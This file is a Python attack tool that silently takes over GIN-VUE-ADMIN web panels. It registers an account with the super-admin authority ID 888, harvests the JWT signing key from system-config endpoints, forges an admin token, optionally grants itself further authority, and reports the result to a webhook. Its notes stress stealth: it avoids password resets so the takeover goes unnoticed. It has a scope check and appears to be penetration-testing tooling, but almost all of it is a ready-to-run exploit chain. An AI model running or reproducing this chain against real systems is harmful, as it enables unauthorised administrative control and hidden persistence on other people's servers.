#!/usr/bin/env python3
"""GIN-VUE-ADMIN 静默提权：register-888 → leak jwt-key → forge admin → notify。

对齐：传承/锦府·静默.md
默认不做 resetPassword。

示例:
  python3 炼蛊房/ginvue_stealth_takeover.py chain \\
    --base https://授权 --case <案卷> \\
    --username ops_cache_0811 --password '…' \\
    --webhook \"$OPS_WEBHOOK\" --insecure
"""
from __future__ import annotations

import argparse
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-ginvue_stealth_takeover"

REGISTER_PATHS = (
    "/api/user/register",
    "/api/user/admin_register",
    "/user/register",
    "/base/register",
)

LOGIN_PATHS = (
    "/api/base/login",
    "/base/login",
    "/api/user/login",
)

CONFIG_PATHS = (
    "/api/system/getSystemConfig",
    "/api/system/config",
    "/api/base/getSystemConfig",
    "/system/getSystemConfig",
)

USERINFO_PATHS = (
    "/api/user/getUserInfo",
    "/user/getUserInfo",
)

AUTHORITY_PATHS = (
    "/api/user/setUserAuthority",
    "/api/user/setUserAuthorities",
    "/user/setUserAuthority",
)

JWT_KEY_RE = re.compile(
    r"""(?i)(?:jwt[-_]?key|signing[-_]?key|secret[-_]?key)["']?\s*[:=]\s*["']([0-9a-fA-F\-]{8,}|[A-Za-z0-9_\-]{16,})["']"""
)



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "ginvue_stealth"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] refuse out-of-scope host: {h}")


def ssl_ctx(insecure: bool) -> ssl.SSLContext:
    return ssl._create_unverified_context() if insecure else ssl.create_default_context()


def http_json(
    url: str,
    *,
    method: str = "POST",
    body: dict[str, Any] | None = None,
    token: str | None = None,
    insecure: bool = False,
    timeout: float = 25.0,
) -> dict[str, Any]:
    data = None if body is None else json.dumps(body, ensure_ascii=False).encode("utf-8")
    headers = {
        "User-Agent": UA,
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    if token:
        headers["x-token"] = token
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx(insecure)) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            code = resp.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        code = e.code
    parsed: Any
    try:
        parsed = json.loads(raw) if raw else {}
    except json.JSONDecodeError:
        parsed = {"_raw": raw[:2000]}
    return {"status": code, "json": parsed, "raw": raw}


def save(case: str, name: str, obj: Any) -> Path:
    p = case_dir(case) / name
    p.write_text(json.dumps(obj, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    try:
        p.chmod(0o600)
    except OSError:
        pass
    return p


def redact_secrets(obj: Any) -> Any:
    """Drop obvious secret values for notify / public-ish RESULT."""
    if isinstance(obj, dict):
        out = {}
        for k, v in obj.items():
            lk = str(k).lower()
            if any(x in lk for x in ("password", "jwt", "token", "secret", "key", "passwd")):
                if isinstance(v, str) and len(v) > 8:
                    out[k] = v[:4] + "…redacted"
                    continue
            out[k] = redact_secrets(v)
        return out
    if isinstance(obj, list):
        return [redact_secrets(x) for x in obj]
    return obj


def extract_token(j: Any) -> str | None:
    if not isinstance(j, dict):
        return None
    # GVA: { code:0, data: { token, user } }
    data = j.get("data") if isinstance(j.get("data"), dict) else j
    for k in ("token", "Token", "x-token", "accessToken"):
        v = data.get(k) if isinstance(data, dict) else None
        if isinstance(v, str) and len(v) > 20:
            return v
    nested = data.get("user") if isinstance(data, dict) else None
    if isinstance(nested, dict):
        for k in ("token", "Token"):
            v = nested.get(k)
            if isinstance(v, str) and len(v) > 20:
                return v
    return None


def extract_jwt_key(blob: Any) -> str | None:
    text = json.dumps(blob, ensure_ascii=False) if not isinstance(blob, str) else blob
    m = JWT_KEY_RE.search(text)
    if m:
        return m.group(1)
    # walk dict for exact keys
    if isinstance(blob, dict):
        for k, v in blob.items():
            lk = str(k).lower().replace("_", "-")
            if lk in ("jwt-key", "jwtkey", "signing-key", "secret-key") and isinstance(v, str) and len(v) >= 8:
                return v
            if isinstance(v, (dict, list)):
                hit = extract_jwt_key(v)
                if hit:
                    return hit
        data = blob.get("data")
        if data is not None:
            return extract_jwt_key(data)
    if isinstance(blob, list):
        for item in blob:
            hit = extract_jwt_key(item)
            if hit:
                return hit
    return None


def forge_gva_jwt(
    jwt_key: str,
    *,
    admin_id: int,
    admin_user: str,
    authority_id: int,
    nick: str,
    hours: int = 24,
) -> str:
    try:
        import jwt  # PyJWT
    except ImportError as e:
        raise SystemExit("need PyJWT: pip install PyJWT") from e
    now = int(time.time())
    payload = {
        "ID": admin_id,
        "Username": admin_user,
        "NickName": nick,
        "AuthorityId": authority_id,
        "BufferTime": hours * 3600,
        "exp": now + hours * 3600,
        "iss": "qmPlus",
        "nbf": now,
    }
    return jwt.encode(payload, jwt_key, algorithm="HS256")


def try_paths(
    base: str,
    paths: tuple[str, ...],
    *,
    body: dict[str, Any] | None,
    token: str | None,
    insecure: bool,
    method: str = "POST",
) -> list[dict[str, Any]]:
    rows = []
    for path in paths:
        url = base.rstrip("/") + path
        r = http_json(url, method=method, body=body, token=token, insecure=insecure)
        rows.append({"path": path, "status": r["status"], "json": r["json"], "raw_preview": r["raw"][:400]})
    return rows


def cmd_register_888(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    body = {
        "username": args.username,
        "password": args.password,
        "nickName": args.nick or args.username,
        "headerImg": "",
        "authorityId": args.authority_id,
        "enable": 1,
    }
    if args.extra_json:
        body.update(json.loads(args.extra_json))
    rows = try_paths(args.base, REGISTER_PATHS, body=body, token=None, insecure=args.insecure)
    # login after register
    login_rows = try_paths(
        args.base,
        LOGIN_PATHS,
        body={"username": args.username, "password": args.password},
        token=None,
        insecure=args.insecure,
    )
    token = None
    for row in login_rows:
        token = extract_token(row["json"])
        if token:
            break
    # authority check
    info = None
    if token:
        for path in USERINFO_PATHS:
            r = http_json(
                args.base.rstrip("/") + path,
                method="GET",
                body=None,
                token=token,
                insecure=args.insecure,
            )
            if r["status"] < 400:
                info = r["json"]
                break
            r2 = http_json(
                args.base.rstrip("/") + path,
                method="POST",
                body={},
                token=token,
                insecure=args.insecure,
            )
            if r2["status"] < 400:
                info = r2["json"]
                break

    report = {
        "checked_at": _now(),
        "username": args.username,
        "authority_id_requested": args.authority_id,
        "register_attempts": [{"path": x["path"], "status": x["status"], "body": x["json"]} for x in rows],
        "login_ok": bool(token),
        "token_redacted": (token[:12] + "…") if token else None,
        "userinfo": redact_secrets(info) if info else None,
        "l1_planted_superadmin": bool(token),
        "note": "Do NOT resetPassword on original admin. Prefer forge-admin + notify.",
    }
    # keep full token private
    private = {**report, "token": token}
    save(args.case, "register_888.json", private)
    save(args.case, "register_888.redacted.json", report)
    print(json.dumps(report, ensure_ascii=False, indent=2))
    if token:
        print("[token] saved under 案卷/ginvue_stealth/register_888.json (chmod 600)")
    return 0 if token else 1


def cmd_leak_config(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    rows = try_paths(args.base, CONFIG_PATHS, body={}, token=args.token, insecure=args.insecure)
    # also GET
    for path in CONFIG_PATHS:
        url = args.base.rstrip("/") + path
        r = http_json(url, method="GET", body=None, token=args.token, insecure=args.insecure)
        rows.append({"path": path + "#GET", "status": r["status"], "json": r["json"], "raw_preview": r["raw"][:400]})
    key = None
    for row in rows:
        key = extract_jwt_key(row["json"]) or extract_jwt_key(row.get("raw_preview", ""))
        if key:
            break
    private = {"checked_at": _now(), "jwt_key": key, "rows": rows}
    public = {
        "checked_at": _now(),
        "jwt_key_redacted": (key[:6] + "…redacted") if key else None,
        "found": bool(key),
        "paths_hit": [r["path"] for r in rows if r["status"] < 400],
    }
    save(args.case, "leak_config.json", private)
    save(args.case, "leak_config.redacted.json", public)
    print(json.dumps(public, ensure_ascii=False, indent=2))
    return 0 if key else 1


def cmd_forge_admin(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    key = args.jwt_key
    if not key and args.case:
        p = case_dir(args.case) / "leak_config.json"
        if p.exists():
            key = json.loads(p.read_text(encoding="utf-8")).get("jwt_key")
    if not key:
        raise SystemExit("need --jwt-key or prior leak_config.json")
    token = forge_gva_jwt(
        key,
        admin_id=args.admin_id,
        admin_user=args.admin_user,
        authority_id=args.authority_id,
        nick=args.nick or "超级管理员",
        hours=args.hours,
    )
    info = None
    for path in USERINFO_PATHS:
        for method in ("GET", "POST"):
            r = http_json(
                args.base.rstrip("/") + path,
                method=method,
                body={} if method == "POST" else None,
                token=token,
                insecure=args.insecure,
            )
            if r["status"] < 400 and r["json"]:
                info = r["json"]
                break
        if info:
            break
    ok = bool(info)
    private = {
        "checked_at": _now(),
        "forged_token": token,
        "admin_id": args.admin_id,
        "admin_user": args.admin_user,
        "userinfo": info,
        "l2_forged_admin": ok,
        "reset_password_used": False,
    }
    public = {
        "checked_at": _now(),
        "admin_id": args.admin_id,
        "admin_user": args.admin_user,
        "token_redacted": token[:16] + "…",
        "l2_forged_admin": ok,
        "userinfo": redact_secrets(info) if info else None,
        "reset_password_used": False,
        "note": "Silent priv: forged JWT only; do not resetPassword.",
    }
    save(args.case, "forge_admin.json", private)
    save(args.case, "forge_admin.redacted.json", public)
    print(json.dumps(public, ensure_ascii=False, indent=2))
    return 0 if ok else 1


def cmd_plant_authority(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    body = {
        "id": args.target_id,
        "authorityId": args.authority_id,
        "authorityIds": [args.authority_id],
        "username": args.target_user,
    }
    # strip nulls
    body = {k: v for k, v in body.items() if v is not None and v != ""}
    rows = try_paths(args.base, AUTHORITY_PATHS, body=body, token=args.token, insecure=args.insecure)
    ok = any(r["status"] < 400 and (r["json"].get("code") in (0, 200, None) or r["status"] == 200) for r in rows)
    report = {
        "checked_at": _now(),
        "target_user": args.target_user,
        "target_id": args.target_id,
        "authority_id": args.authority_id,
        "attempts": [{"path": r["path"], "status": r["status"], "json": r["json"]} for r in rows],
        "l3_plant_hint": ok,
        "reset_password_used": False,
    }
    save(args.case, "plant_authority.json", report)
    print(json.dumps(report, ensure_ascii=False, indent=2))
    return 0 if ok else 1


def cmd_notify(args: argparse.Namespace) -> int:
    webhook = args.webhook or os.environ.get("DAAIXIANZUN_NOTIFY_WEBHOOK", "")
    payload = {
        "ts": _now(),
        "case": args.case,
        "title": args.title,
        "body": args.body,
        "source": "ginvue_stealth_takeover",
    }
    save(args.case, "notify_payload.json", payload)
    if not webhook:
        print("[notify] no webhook; wrote notify_payload.json only")
        print(json.dumps(payload, ensure_ascii=False, indent=2))
        return 0
    # Slack/飞书等常在 scope 外；默认只落盘，显式允许才外发
    h = host_of(webhook) if "://" in webhook else ""
    if h and h not in ("127.0.0.1", "localhost") and not in_scope(h):
        if os.environ.get("DAAIXIANZUN_NOTIFY_ALLOW_OUT", "") != "1":
            print("[notify] webhook host out of scope; set DAAIXIANZUN_NOTIFY_ALLOW_OUT=1 to send")
            print("[notify] payload saved only")
            return 0
    r = http_json(webhook, method="POST", body=payload, token=None, insecure=True)
    save(args.case, "notify_result.json", {"status": r["status"], "body": r["raw"][:500]})
    print(f"[notify] HTTP {r['status']}")
    return 0 if r["status"] < 400 else 1


def cmd_chain(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    # 1 register
    rc = cmd_register_888(args)
    reg_path = case_dir(args.case) / "register_888.json"
    token = None
    if reg_path.exists():
        token = json.loads(reg_path.read_text(encoding="utf-8")).get("token")
    if not token:
        print("[chain] L1 failed — stop before forge")
        _finalize_result(args, l1=False, l2=False, l3=False)
        return 1
    # 2 leak
    args.token = token
    cmd_leak_config(args)
    leak = case_dir(args.case) / "leak_config.json"
    key = json.loads(leak.read_text(encoding="utf-8")).get("jwt_key") if leak.exists() else None
    l2 = False
    if key:
        args.jwt_key = key
        l2 = cmd_forge_admin(args) == 0
    else:
        print("[chain] no jwt-key; L1 planted account still usable")
    # optional plant on self with forged or plant token
    l3 = False
    forged_path = case_dir(args.case) / "forge_admin.json"
    plant_token = token
    if forged_path.exists():
        plant_token = json.loads(forged_path.read_text(encoding="utf-8")).get("forged_token") or token
    if args.do_plant and plant_token:
        args.token = plant_token
        args.target_user = args.username
        args.target_id = args.plant_target_id
        l3 = cmd_plant_authority(args) == 0
    # notify
    level = "L2" if l2 else ("L1" if rc == 0 else "L0")
    if l3:
        level = "L3"
    args.title = args.title or f"GVA stealth {level}"
    args.body = args.body or (
        f"case={args.case} user={args.username} authorityId={args.authority_id} "
        f"forged_admin={l2} planted_extra={l3} resetPassword=NO"
    )
    cmd_notify(args)
    _finalize_result(args, l1=(rc == 0), l2=l2, l3=l3)
    return 0 if (rc == 0 or l2) else 1


def _finalize_result(args: argparse.Namespace, *, l1: bool, l2: bool, l3: bool) -> None:
    result = {
        "checked_at": _now(),
        "base": args.base,
        "username": getattr(args, "username", None),
        "l1_planted": l1,
        "l2_forged_admin": l2,
        "l3_extra_plant": l3,
        "reset_password_used": False,
        "anti_pattern": "resetPassword on original admin — NOT used",
        "evidence": str(case_dir(args.case)),
    }
    save(args.case, "RESULT.json", result)
    print("[RESULT]", json.dumps(result, ensure_ascii=False))


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="GVA stealth takeover (no resetPassword)")
    sub = p.add_subparsers(dest="cmd", required=True)

    def common(sp: argparse.ArgumentParser) -> None:
        sp.add_argument("--base", required=True)
        sp.add_argument("--case", required=True)
        sp.add_argument("--insecure", action="store_true")

    r = sub.add_parser("register-888", help="Register with authorityId (plant superadmin)")
    common(r)
    r.add_argument("--username", required=True)
    r.add_argument("--password", required=True)
    r.add_argument("--nick", default="")
    r.add_argument("--authority-id", type=int, default=888)
    r.add_argument("--extra-json", default="")
    r.set_defaults(func=cmd_register_888)

    l = sub.add_parser("leak-config", help="getSystemConfig → jwt-key")
    common(l)
    l.add_argument("--token", required=True)
    l.set_defaults(func=cmd_leak_config)

    f = sub.add_parser("forge-admin", help="Forge admin JWT (no password reset)")
    common(f)
    f.add_argument("--jwt-key", default="")
    f.add_argument("--admin-id", type=int, default=1)
    f.add_argument("--admin-user", default="admin")
    f.add_argument("--authority-id", type=int, default=888)
    f.add_argument("--nick", default="")
    f.add_argument("--hours", type=int, default=24)
    f.set_defaults(func=cmd_forge_admin)

    a = sub.add_parser("plant-authority", help="setUserAuthority secondary plant")
    common(a)
    a.add_argument("--token", required=True)
    a.add_argument("--target-user", default="")
    a.add_argument("--target-id", type=int, default=None)
    a.add_argument("--authority-id", type=int, default=888)
    a.set_defaults(func=cmd_plant_authority)

    n = sub.add_parser("notify", help="Webhook / case notify (redacted)")
    n.add_argument("--case", required=True)
    n.add_argument("--webhook", default="")
    n.add_argument("--title", default="GVA stealth")
    n.add_argument("--body", default="")
    n.set_defaults(func=cmd_notify)

    c = sub.add_parser("chain", help="register → leak → forge → notify (no resetPassword)")
    common(c)
    c.add_argument("--username", required=True)
    c.add_argument("--password", required=True)
    c.add_argument("--nick", default="")
    c.add_argument("--authority-id", type=int, default=888)
    c.add_argument("--extra-json", default="")
    c.add_argument("--admin-id", type=int, default=1)
    c.add_argument("--admin-user", default="admin")
    c.add_argument("--hours", type=int, default=24)
    c.add_argument("--do-plant", action="store_true", help="also setUserAuthority on planted user")
    c.add_argument("--plant-target-id", type=int, default=None)
    c.add_argument("--webhook", default="")
    c.add_argument("--title", default="")
    c.add_argument("--body", default="")
    c.set_defaults(func=cmd_chain)

    return p


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
